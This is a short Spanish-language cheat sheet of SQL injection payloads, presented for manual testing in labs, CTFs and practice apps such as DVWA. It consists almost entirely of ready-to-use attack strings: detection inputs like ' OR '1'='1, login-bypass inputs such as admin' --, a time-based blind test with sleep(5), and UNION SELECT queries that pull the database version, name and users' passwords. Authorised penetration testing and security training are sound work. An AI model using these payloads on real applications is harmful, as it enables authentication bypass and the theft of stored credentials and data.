# 🔍 SQLIjection PayLoads Cheatsheet

>  Lista de SQL Injection payloads comunes agrupados por categorías. Son útiles para pruebas manuales en aplicaciones vulnerables, como en laboratorios, CTFs o entornos como DVWA, OWASP BWA, Mr. Robot, etc.



---

##  🧪 1. Pruebas básicas para detectar SQLi

' OR '1'='1

" OR "1"="1
' OR 1=1 --
" OR 1=1 --
' OR 'a'='a
' #
'-- 

### 🛡️ 2. Bypass de autenticación (login forms)

admin' --
admin' #
admin' or '1'='1
' or 1=1 limit 1; --
' or sleep(5) --  -- (para detectar blind SQLi)

### 📊 3. Enumeración de datos

' UNION SELECT null, version() -- 
' UNION SELECT null, database() --
' UNION SELECT user(), password FROM users --

